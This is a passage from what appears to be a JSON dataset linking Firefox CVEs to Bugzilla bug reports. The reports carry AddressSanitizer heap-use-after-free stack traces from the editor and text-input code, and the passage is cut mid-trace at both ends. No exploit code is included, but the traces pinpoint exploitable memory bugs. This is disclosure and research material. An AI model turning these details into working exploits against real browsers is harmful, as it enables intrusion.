117M really freed by 185135 calls Stats: 532M (136282 full pages) mmaped in 133 calls mmaps by size class: 8:442341; 9:40955; 10:16380; 11:14329; 12:3072; 13:1536; 14:1280; 15:256; 16:448; 17:1248; 18:208; 19:104; 20:20; mallocs by size class: 8:550715; 9:52926; 10:18484; 11:17824; 12:3165; 13:2149; 14:1685; 15:376; 16:564; 17:1361; 18:228; 19:106; 20:19; frees by size class: 8:331303; 9:43136; 10:15020; 11:14592; 12:2157; 13:1812; 14:1407; 15:329; 16:504; 17:1346; 18:149; 19:103; 20:15; rfrees by size class: 8:136366; 9:24837; 10:9558; 11:10277; 12:996; 13:829; 14:830; 15:183; 16:354; 17:869; 18:30; 19:5; 20:1; Stats: malloc large: 1714 small slow: 2570 ==24146== ABORTING"
      }
    ],
    "CVE-2012-4213": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=795708",
        "title": "Heap-use-after-free in nsEditor::FindNextLeafNode",
        "description": "Reproduces on trunk ================================================================= ==10788== ERROR: AddressSanitizer heap-use-after-free on address 0x7f236f299db8 at pc 0x7f239927cf45 bp 0x7fff229632d0 sp 0x7fff229632c8 READ of size 8 at 0x7f236f299db8 thread T0 #0 0x7f239927cf44 in nsINode::GetPreviousSibling() const src/../../dist/include/nsINode.h:1142 #1 0x7f239e1112e2 in nsEditor::FindNextLeafNode(nsINode*, bool, bool) src/editor/libeditor/base/nsEditor.cpp:3319 #2 0x7f239e1108dc in nsEditor::FindNode(nsINode*, bool, bool, bool) src/editor/libeditor/base/nsEditor.cpp:3401 #3 0x7f239e110cc1 in nsEditor::FindNode(nsINode*, bool, bool, bool) src/editor/libeditor/base/nsEditor.cpp:3411 #4 0x7f239e10ca79 in nsEditor::GetPriorNode(nsINode*, bool, bool) src/editor/libeditor/base/nsEditor.cpp:3301 #5 0x7f239e10c106 in nsEditor::GetPriorNode(nsINode*, int, bool, bool) src/editor/libeditor/base/nsEditor.cpp:3190 #6 0x7f239e649789 in nsHTMLEditor::GetPriorHTMLNode(nsINode*, int, bool) src/editor/libeditor/html/nsHTMLEditor.cpp:4104 #7 0x7f239e7c3182 in nsHTMLEditRules::GetPromotedPoint(nsHTMLEditRules::RulesEndpoint, nsIDOMNode*, int, EditAction, nsCOMPtr<nsIDOMNode>*, int*) src/editor/libeditor/html/nsHTMLEditRules.cpp:5277 #8 0x7f239e6d078e in nsHTMLEditRules::PromoteRange(nsIDOMRange*, EditAction) src/editor/libeditor/html/nsHTMLEditRules.cpp:5493 #9 0x7f239e6cac26 in nsHTMLEditRules::AfterEditInner(EditAction, short) src/editor/libeditor/html/nsHTMLEditRules.cpp:430 #10 0x7f239e6c8df6 in nsHTMLEditRules::AfterEdit(EditAction, short) src/editor/libeditor/html/nsHTMLEditRules.cpp:376 #11 0x7f239e63798c in nsHTMLEditor::EndOperation() src/editor/libeditor/html/nsHTMLEditor.cpp:3513 #12 0x7f239e06d372 in ~nsAutoRules src/editor/libeditor/base/nsEditorUtils.h:94 #13 0x7f239e04afc6 in ~nsAutoRules src/editor/libeditor/base/nsEditorUtils.h:91 #14 0x7f239e610e37 in nsHTMLEditor::Align(nsAString_internal const&) src/editor/libeditor/html/nsHTMLEditor.cpp:2264 #15 0x7f239e610fee in non-virtual thunk to nsHTMLEditor::Align(nsAString_internal const&) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #16 0x7f23a1b430b0 in nsAlignCommand::SetState(nsIEditor*, nsString&) src/editor/composer/src/nsComposerCommands.cpp:970 #17 0x7f23a1b37113 in nsMultiStateCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/editor/composer/src/nsComposerCommands.cpp:599 #18 0x7f23a13912e2 in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:175 #19 0x7f23a136257d in nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) src/embedding/components/commandhandler/src/nsBaseCommandController.cpp:153 #20 0x7f23a1362796 in non-virtual thunk to nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #21 0x7f23a137abd3 in nsCommandManager::DoCommand(char const*, nsICommandParams*, nsIDOMWindow*) src/embedding/components/commandhandler/src/nsCommandManager.cpp:234 #22 0x7f239c901752 in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) src/content/html/document/src/nsHTMLDocument.cpp:3235 #23 0x7f239c902c9d in non-virtual thunk to nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #24 0x7f23a4ebb543 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #25 0x7f23a00bcfa8 in CallMethodHelper::Invoke() src/js/xpconnect/src/XPCWrappedNative.cpp:3110 #26 0x7f23a011e1a5 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1469 #27 0x7f23ab687d9f in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:370 #28 0x7f23ab629b79 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2460 #29 0x7f23ab575aee in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) src/js/src/jsinterp.cpp:324 #30 0x7f23ab695566 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:509 #31 0x7f23ab6972fb in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:546 #32 0x7f23aadaa289 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5679 #33 0x7f239d0c1dee in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1506 #34 0x7f239d27ab76 in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9621 #35 0x7f239d2326c4 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9880 #36 0x7f239d278a28 in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10147 #37 0x7f23a4def972 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #38 0x7f23a4df0e7a in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #39 0x7f23a4db4580 in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:612 #40 0x7f23a4a46ecb in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #41 0x7f23a34903b6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #42 0x7f23a506ce11 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #43 0x7f23a506cc46 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #44 0x7f23a506cb2b in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #45 0x7f23a2937dda in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #46 0x7f23a156a9b4 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:290 #47 0x7f2397bdda4d in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3782 #48 0x7f2397be38c5 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3848 #49 0x7f2397be6774 in XRE_main src/toolkit/xre/nsAppRunner.cpp:3923 #50 0x40d013 in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #51 0x40a755 in main src/browser/app/nsBrowserApp.cpp:279 #52 0x7f23b5adbc4c in ?? ??:0 0x7f236f299db8 is located 56 bytes inside of 120-byte region [0x7f236f299d80,0x7f236f299df8) freed by thread T0 here: #0 0x4c4af0 in free ??:0 #1 0x7f23b2967586 in moz_free src/memory/mozalloc/mozalloc.cpp:51 #2 0x7f239b3afccd in operator delete(void*) src/../../../dist/include/mozilla/mozalloc.h:224 #3 0x7f239b28424d in nsNodeUtils::LastRelease(nsINode*) src/content/base/src/nsNodeUtils.cpp:260 #4 0x7f239b138dfd in nsGenericDOMDataNode::Release() src/content/base/src/nsGenericDOMDataNode.cpp:113 #5 0x7f239b3b00d7 in nsTextNode::Release() src/content/base/src/nsTextNode.cpp:125 #6 0x7f239b3b018b in non-virtual thunk to nsTextNode::Release() src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #7 0x7f2397ba18db in ~nsCOMPtr_base src/../../dist/include/nsCOMPtr.h:408 #8 0x7f2399415899 in nsCOMPtr<nsIDOMNode>::~nsCOMPtr() src/../../../dist/include/nsCOMPtr.h:447 #9 0x7f2399402ab6 in nsCOMPtr<nsIDOMNode>::~nsCOMPtr() src/../../../dist/include/nsCOMPtr.h:447 #10 0x7f239e64ff9d in nsHTMLEditor::IsVisTextNode(nsIContent*, bool*, bool) src/editor/libeditor/html/nsHTMLEditor.cpp:4408 #11 0x7f239e64e47a in nsHTMLEditor::IsTextInDirtyFrameVisible(nsIContent*) src/editor/libeditor/html/nsHTMLEditor.cpp:4348 #12 0x7f239e11704e in nsEditor::IsEditable(nsIContent*) src/editor/libeditor/base/nsEditor.cpp:3742 #13 0x7f239e67039c in nsHTMLEditor::IsEditable(nsIContent*) src/editor/libeditor/html/nsHTMLEditor.cpp:5459 #14 0x7f239e110a91 in nsEditor::FindNode(nsINode*, bool, bool, bool) src/editor/libeditor/base/nsEditor.cpp:3407 #15 0x7f239e10ca79 in nsEditor::GetPriorNode(nsINode*, bool, bool) src/editor/libeditor/base/nsEditor.cpp:3301 #16 0x7f239e10c106 in nsEditor::GetPriorNode(nsINode*, int, bool, bool) src/editor/libeditor/base/nsEditor.cpp:3190 #17 0x7f239e649789 in nsHTMLEditor::GetPriorHTMLNode(nsINode*, int, bool) src/editor/libeditor/html/nsHTMLEditor.cpp:4104 #18 0x7f239e7c3182 in nsHTMLEditRules::GetPromotedPoint(nsHTMLEditRules::RulesEndpoint, nsIDOMNode*, int, EditAction, nsCOMPtr<nsIDOMNode>*, int*) src/editor/libeditor/html/nsHTMLEditRules.cpp:5277 #19 0x7f239e6d078e in nsHTMLEditRules::PromoteRange(nsIDOMRange*, EditAction) src/editor/libeditor/html/nsHTMLEditRules.cpp:5493 #20 0x7f239e6cac26 in nsHTMLEditRules::AfterEditInner(EditAction, short) src/editor/libeditor/html/nsHTMLEditRules.cpp:430 #21 0x7f239e6c8df6 in nsHTMLEditRules::AfterEdit(EditAction, short) src/editor/libeditor/html/nsHTMLEditRules.cpp:376 #22 0x7f239e63798c in nsHTMLEditor::EndOperation() src/editor/libeditor/html/nsHTMLEditor.cpp:3513 #23 0x7f239e06d372 in ~nsAutoRules src/editor/libeditor/base/nsEditorUtils.h:94 #24 0x7f239e04afc6 in ~nsAutoRules src/editor/libeditor/base/nsEditorUtils.h:91 #25 0x7f239e610e37 in nsHTMLEditor::Align(nsAString_internal const&) src/editor/libeditor/html/nsHTMLEditor.cpp:2264 #26 0x7f239e610fee in non-virtual thunk to nsHTMLEditor::Align(nsAString_internal const&) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #27 0x7f23a1b430b0 in nsAlignCommand::SetState(nsIEditor*, nsString&) src/editor/composer/src/nsComposerCommands.cpp:970 #28 0x7f23a1b37113 in nsMultiStateCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/editor/composer/src/nsComposerCommands.cpp:599 #29 0x7f23a13912e2 in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:175 previously allocated by thread T0 here: #0 0x4c4bb0 in __interceptor_malloc ??:0 #1 0x7f23b29676da in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 #2 0x7f239b3af0d0 in operator new(unsigned long) src/../../../dist/include/mozilla/mozalloc.h:200 #3 0x7f239e412cc7 in nsHtml5TreeOperation::AppendText(unsigned short const*, unsigned int, nsIContent*, nsHtml5TreeOpExecutor*) src/parser/html/nsHtml5TreeOperation.cpp:163 #4 0x7f239e41de8a in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) src/parser/html/nsHtml5TreeOperation.cpp:444 #5 0x7f239e43ab75 in nsHtml5TreeOpExecutor::RunFlushLoop() src/parser/html/nsHtml5TreeOpExecutor.cpp:564 #6 0x7f239e477259 in nsHtml5ExecutorFlusher::Run() src/parser/html/nsHtml5StreamParser.cpp:127 #7 0x7f23a4db4580 in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:612 #8 0x7f23a4a46ecb in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #9 0x7f23a34903b6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #10 0x7f23a506ce11 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #11 0x7f23a506cc46 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #12 0x7f23a506cb2b in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #13 0x7f23a2937dda in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #14 0x7f23a156a9b4 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:290 #15 0x7f2397bdda4d in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3782 #16 0x7f2397be38c5 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3848 #17 0x7f2397be6774 in XRE_main src/toolkit/xre/nsAppRunner.cpp:3923 #18 0x40d013 in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #19 0x40a755 in main src/browser/app/nsBrowserApp.cpp:279 #20 0x7f23b5adbc4c in ?? ??:0 Shadow byte and word: 0x1fe46de533b7: fd 0x1fe46de533b0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe46de53390: 00 00 00 00 00 00 00 00 0x1fe46de53398: 06 fb fb fb fb fb fb fb 0x1fe46de533a0: fa fa fa fa fa fa fa fa 0x1fe46de533a8: fa fa fa fa fa fa fa fa =>0x1fe46de533b0: fd fd fd fd fd fd fd fd 0x1fe46de533b8: fd fd fd fd fd fd fd fd 0x1fe46de533c0: fa fa fa fa fa fa fa fa 0x1fe46de533c8: fa fa fa fa fa fa fa fa 0x1fe46de533d0: 00 00 00 00 00 00 00 00 Stats: 260M malloced (302M for red zones) by 541116 calls Stats: 44M realloced by 25176 calls Stats: 227M freed by 312858 calls Stats: 92M really freed by 204843 calls Stats: 484M (123992 full pages) mmaped in 121 calls mmaps by size class: 8:311277; 9:32764; 10:12285; 11:14329; 12:3072; 13:1536; 14:1536; 15:256; 16:1024; 17:1248; 18:144; 19:40; 20:20; mallocs by size class: 8:466783; 9:36490; 10:11191; 11:16795; 12:2871; 13:1975; 14:1888; 15:396; 16:1190; 17:1317; 18:159; 19:41; 20:20; frees by size class: 8:255470; 9:27519; 10:7990; 11:13506; 12:2059; 13:1677; 14:1698; 15:352; 16:1127; 17:1300; 18:105; 19:38; 20:17; rfrees by size class: 8:182058; 9:9100; 10:1831; 11:8659; 12:596; 13:527; 14:531; 15:179; 16:934; 17:399; 18:24; 19:4; 20:1; Stats: malloc large: 1537 small slow: 2600 ==10788== ABORTING"
      }
    ],
    "CVE-2012-4214": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=795804",
        "title": "Heap-use-after-free in nsTextEditorState::PrepareEditor",
        "description": "Reproduces on trunk. Run a few firefox instances simultaneously for reproducing reliabily. ================================================================= ==19969== ERROR: AddressSanitizer heap-use-after-free on address 0x7f310f2083b0 at pc 0x7f313ddafc7c bp 0x7fffb5d04130 sp 0x7fffb5d04128 READ of size 8 at 0x7f310f2083b0 thread T0 #0 0x7f313ddafc7b in nsTextEditorState::PrepareEditor(nsAString_internal const*) src/content/html/content/src/nsTextEditorState.cpp:1125 #1 0x7f313ddcd603 in PrepareEditorEvent::Run() src/content/html/content/src/nsTextEditorState.cpp:1026 #2 0x7f313cad7c4c in nsContentUtils::RemoveScriptBlocker() src/content/base/src/nsContentUtils.cpp:5021 #3 0x7f313b04835e in ~nsAutoScriptBlocker src/../../../../dist/include/nsContentUtils.h:2275 #4 0x7f313b0320a6 in ~nsAutoScriptBlocker src/../../../../dist/include/nsContentUtils.h:2274 #5 0x7f313b43fc91 in PresShell::FlushPendingNotifications(mozFlushType) src/layout/base/nsPresShell.cpp:3834 #6 0x7f313bb77232 in nsHideViewer::Run() src/layout/generic/nsSubDocumentFrame.cpp:782 #7 0x7f313cad7c4c in nsContentUtils::RemoveScriptBlocker() src/content/base/src/nsContentUtils.cpp:5021 #8 0x7f313b04835e in ~nsAutoScriptBlocker src/../../../../dist/include/nsContentUtils.h:2275 #9 0x7f313b0320a6 in ~nsAutoScriptBlocker src/../../../../dist/include/nsContentUtils.h:2274 #10 0x7f313ccf2af5 in nsDocument::AdoptNode(nsIDOMNode*, nsIDOMNode**) src/content/base/src/nsDocument.cpp:6371 #11 0x7f313e668b5c in nsHTMLDocument::AdoptNode(nsIDOMNode*, nsIDOMNode**) src/content/html/document/src/nsHTMLDocument.h:87 #12 0x7f3141f73cd6 in nsIDOMDocument_AdoptNode(JSContext*, unsigned int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:3452 #13 0x7f314d3dcd9f in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:370 #14 0x7f314d37eb79 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2460 #15 0x7f314d2caaee in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) src/js/src/jsinterp.cpp:324 #16 0x7f314d3ea566 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:509 #17 0x7f314d3ec2fb in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:546 #18 0x7f314caff289 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5679 #19 0x7f313ee16dee in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1506 #20 0x7f313efcfb76 in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9621 #21 0x7f313ef876c4 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9880 #22 0x7f313efcda28 in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10147 #23 0x7f3146b44972 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #24 0x7f3146b45e7a in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #25 0x7f3146b09580 in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:612 #26 0x7f314679becb in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #27 0x7f31451e53b6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #28 0x7f3146dc1e11 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #29 0x7f3146dc1c46 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #30 0x7f3146dc1b2b in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #31 0x7f314468cdda in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #32 0x7f31432bf9b4 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:290 #33 0x7f3139932a4d in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3782 #34 0x7f31399388c5 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3848 #35 0x7f313993b774 in XRE_main src/toolkit/xre/nsAppRunner.cpp:3923 #36 0x40d013 in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #37 0x40a755 in main src/browser/app/nsBrowserApp.cpp:279 #38 0x7f3157830c4c in ?? ??:0 0x7f310f2083b0 is located 48 bytes inside of 120-byte region [0x7f310f208380,0x7f310f2083f8) freed by thread T0 here: #0 0x4c4af0 in free ??:0 #1 0x7f31546bc586 in moz_free src/memory/mozalloc/mozalloc.cpp:51 #2 0x7f313e05e4a6 in operator delete(void*) src/../../../../dist/include/mozilla/mozalloc.h:224 #3 0x7f313e06b9b9 in nsHTMLInputElement::HandleTypeChange(unsigned char) src/content/html/content/src/nsHTMLInputElement.cpp:2621 #4 0x7f313e09a2f4 in nsHTMLInputElement::ParseAttribute(int, nsIAtom*, nsAString_internal const&, nsAttrValue&) src/content/html/content/src/nsHTMLInputElement.cpp:2751 #5 0x7f313cece403 in nsGenericElement::SetAttr(int, nsIAtom*, nsIAtom*, nsAString_internal const&, bool) src/content/base/src/nsGenericElement.cpp:1952 #6 0x7f313dd28b8d in nsGenericHTMLElement::SetAttr(int, nsIAtom*, nsIAtom*, nsAString_internal const&, bool) src/content/html/content/src/nsGenericHTMLElement.cpp:1994 #7 0x7f313dd0c5a3 in nsGenericHTMLElement::SetAttr(int, nsIAtom*, nsAString_internal const&, bool) src/content/html/document/src/../../content/src/nsGenericHTMLElement.h:175 #8 0x7f313dd0e4b7 in nsGenericHTMLElement::SetAttrHelper(nsIAtom*, nsAString_internal const&) src/content/html/content/src/nsGenericHTMLElement.cpp:2863 #9 0x7f313e0772d0 in nsHTMLInputElement::SetType(nsAString_internal const&) src/content/html/content/src/nsHTMLInputElement.cpp:906 #10 0x7f313e07733e in non-virtual thunk to nsHTMLInputElement::SetType(nsAString_internal const&) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #11 0x7f3142620241 in nsIDOMHTMLInputElement_SetType(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::MutableHandle<JS::Value>) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:15518 #12 0x7f314d6bf785 in js::CallJSPropertyOpSetter(JSContext*, int (*)(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::MutableHandle<JS::Value>), JS::Handle<JSObject*>, JS::Handle<long>, int, JS::MutableHandle<JS::Value>) src/js/src/jscntxtinlines.h:456 #13 0x7f314d6f6056 in js::baseops::SetPropertyHelper(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<long>, unsigned int, JS::MutableHandle<JS::Value>, int) src/js/src/jsobj.cpp:4592 #14 0x7f314d423bf6 in js::SetPropertyOperation(JSContext*, unsigned char*, JS::Handle<JS::Value>, JS::Handle<JS::Value>) src/js/src/jsinterpinlines.h:355 #15 0x7f314d36ed8e in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2370 #16 0x7f314d2caaee in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) src/js/src/jsinterp.cpp:324 #17 0x7f314d3dd590 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:378 #18 0x7f314cc39f44 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:109 #19 0x7f314d3e29e0 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:411 #20 0x7f314cb0c356 in JS_CallFunctionValue src/js/src/jsapi.cpp:5860 #21 0x7f313ee25356 in nsJSContext::CallEventHandler(nsISupports*, JSObject*, JSObject*, nsIArray*, nsIVariant**) src/dom/base/nsJSEnvironment.cpp:1907 #22 0x7f313f68fc68 in nsJSEventListener::HandleEvent(nsIDOMEvent*) src/dom/src/events/nsJSEventListener.cpp:212 #23 0x7f313da2fecb in nsEventListenerManager::HandleEventSubType(nsListenerStruct*, nsIDOMEventListener*, nsIDOMEvent*, nsIDOMEventTarget*, unsigned int, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:845 #24 0x7f313da31648 in nsEventListenerManager::HandleEventInternal(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.cpp:918 #25 0x7f313dbc773f in nsEventListenerManager::HandleEvent(nsPresContext*, nsEvent*, nsIDOMEvent**, nsIDOMEventTarget*, unsigned int, nsEventStatus*, nsCxPusher*) src/content/events/src/nsEventListenerManager.h:143 #26 0x7f313dbb72de in nsEventTargetChainItem::HandleEvent(nsEventChainPostVisitor&, unsigned int, bool, nsCxPusher*) src/content/events/src/nsEventDispatcher.cpp:182 #27 0x7f313dbb5215 in nsEventTargetChainItem::HandleEventTargetChain(nsEventChainPostVisitor&, unsigned int, nsDispatchingCallback*, bool, nsCxPusher*) src/content/events/src/nsEventDispatcher.cpp:313 #28 0x7f313dbbb569 in nsEventDispatcher::Dispatch(nsISupports*, nsPresContext*, nsEvent*, nsIDOMEvent*, nsEventStatus*, nsDispatchingCallback*, nsCOMArray<nsIDOMEventTarget>*) src/content/events/src/nsEventDispatcher.cpp:629 #29 0x7f313b255602 in DocumentViewerImpl::LoadComplete(tag_nsresult) src/layout/base/nsDocumentViewer.cpp:1024 previously allocated by thread T0 here: #0 0x4c4bb0 in __interceptor_malloc ??:0 #1 0x7f31546bc6da in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 #2 0x7f313e05d2ca in operator new(unsigned long) src/../../../../dist/include/mozilla/mozalloc.h:200 #3 0x7f313e05c040 in NS_NewHTMLInputElement(already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/html/content/src/nsHTMLInputElement.cpp:537 #4 0x7f313e5e54af in CreateHTMLElement(unsigned int, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/html/document/src/nsHTMLContentSink.cpp:497 #5 0x7f313e5e5d0a in NS_NewHTMLElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/html/document/src/nsHTMLContentSink.cpp:480 #6 0x7f313cfa66b1 in NS_NewElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/base/src/nsNameSpaceManager.cpp:201 #7 0x7f314017055a in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) src/parser/html/nsHtml5TreeOperation.cpp:340 #8 0x7f314018fb75 in nsHtml5TreeOpExecutor::RunFlushLoop() src/parser/html/nsHtml5TreeOpExecutor.cpp:564 #9 0x7f31401cc259 in nsHtml5ExecutorFlusher::Run() src/parser/html/nsHtml5StreamParser.cpp:127 #10 0x7f3146b09580 in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:612 #11 0x7f314679becb in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #12 0x7f31451e53b6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #13 0x7f3146dc1e11 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #14 0x7f3146dc1c46 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #15 0x7f3146dc1b2b in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #16 0x7f314468cdda in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #17 0x7f31432bf9b4 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:290 #18 0x7f3139932a4d in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3782 #19 0x7f31399388c5 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3848 #20 0x7f313993b774 in XRE_main src/toolkit/xre/nsAppRunner.cpp:3923 #21 0x40d013 in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #22 0x40a755 in main src/browser/app/nsBrowserApp.cpp:279 Shadow byte and word: 0x1fe621e41076: fd 0x1fe621e41070: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe621e41050: 00 00 00 00 00 00 00 00 0x1fe621e41058: fb fb fb fb fb fb fb fb 0x1fe621e41060: fa fa fa fa fa fa fa fa 0x1fe621e41068: fa fa fa fa fa fa fa fa =>0x1fe621e41070: fd fd fd fd fd fd fd fd 